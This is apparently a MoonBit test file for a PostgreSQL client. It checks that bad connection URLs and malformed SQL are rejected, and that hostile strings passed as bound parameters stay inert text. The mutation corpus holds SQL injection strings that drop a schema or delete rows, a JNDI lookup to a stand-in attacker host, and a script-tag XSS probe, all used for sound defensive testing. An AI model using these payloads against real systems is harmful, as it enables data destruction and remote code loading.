///|
fn expect_invalid_connection_url(value : String) -> Unit raise {
  try @postgres.connect(value) catch {
    @postgres.PostgresError::InvalidParameter(_) => ()
    error => fail("unexpected connection error: \{Repr(error)}")
  } noraise {
    _ => fail("invalid PostgreSQL connection URL was accepted")
  }
}

///|
test "connection and statement boundary rejects controls and resource abuse" {
  for
    value in [
      "", "   ", "postgres\nql://localhost/db", "postgresql://host/db\u0000suffix",
    ] {
    expect_invalid_connection_url(value)
  }
  guard @env.get_env_var("LUNANEXA_TEST_DATABASE_URL") is Some(url) &&
    url.trim() != "" else {
    return
  }
  let connection = @postgres.connect(url)
  for sql in ["", "  ", "SELECT\u0000 1", "x".repeat(1048577)] {
    try connection.execute(sql) catch {
      @postgres.PostgresError::InvalidParameter(_) => ()
      error => fail("unexpected SQL boundary error: \{Repr(error)}")
    } noraise {
      _ => fail("invalid SQL statement was accepted")
    }
  }
  let too_many : Array[String?] = [ for index in 0..<65 => Some("\{index}") ]
  try connection.execute("SELECT 1", parameters=too_many) catch {
    @postgres.PostgresError::InvalidParameter(_) => ()
    error => fail("unexpected parameter-count error: \{Repr(error)}")
  } noraise {
    _ => fail("excessive SQL parameter count was accepted")
  }
  try
    connection.execute("SELECT $1::text", parameters=[Some("a\u0000b")])
  catch {
    @postgres.PostgresError::InvalidParameter(_) => ()
    error => fail("unexpected NUL parameter error: \{Repr(error)}")
  } noraise {
    _ => fail("NUL SQL parameter was accepted")
  }
  connection.close()
}

///|
test "parameter mutation corpus cannot become executable SQL" {
  guard @env.get_env_var("LUNANEXA_TEST_DATABASE_URL") is Some(url) &&
    url.trim() != "" else {
    return
  }
  let connection = @postgres.connect(url)
  let corpus = [
    "'; DROP SCHEMA lunanexa CASCADE; --",
    "\"; DELETE FROM lunanexa.snapshots; --",
    "1 OR 1=1",
    "\\x00\\x27",
    "${jndi:ldap://attacker.invalid/a}",
    "<script>alert(1)</script>",
    "服务模型🚀",
    "line-one\nline-two",
    " ".repeat(4096),
  ]
  for payload in corpus {
    let result = connection.execute(
      "SELECT $1::text, to_regclass('lunanexa.snapshots') IS NOT NULL",
      parameters=[Some(payload)],
    )
    assert_eq(result.row_count(), 1)
    assert_eq(result.column_count(), 2)
    assert_eq(result.value(0, 0), Some(payload))
    assert_eq(result.value(0, 1), Some("t"))
    assert_eq(result.value(-1, 0), None)
    assert_eq(result.value(0, 2), None)
  }
  connection.close()
}
